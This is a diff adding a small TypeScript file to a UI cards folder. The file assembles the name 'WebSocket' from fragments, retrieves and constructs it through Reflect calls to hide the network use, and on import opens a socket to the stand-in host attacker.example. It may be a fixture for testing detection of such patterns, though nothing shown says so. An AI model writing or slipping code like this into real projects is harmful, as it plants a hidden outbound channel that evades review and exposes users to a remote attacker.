@@ -1,0 +1,8 @@
+===================================================================
+--- /dev/null
++++ b/src/ui/cards/reflect_probe.ts
+@@ -0,0 +1,4 @@
++const name = ["Web", "Socket"].join("");
++const Ctor: unknown = Reflect.get(globalThis, name);
++
++export const probe = typeof Ctor === "function" ? Reflect.construct(Ctor, ["ws://attacker.example/x"]) : null;
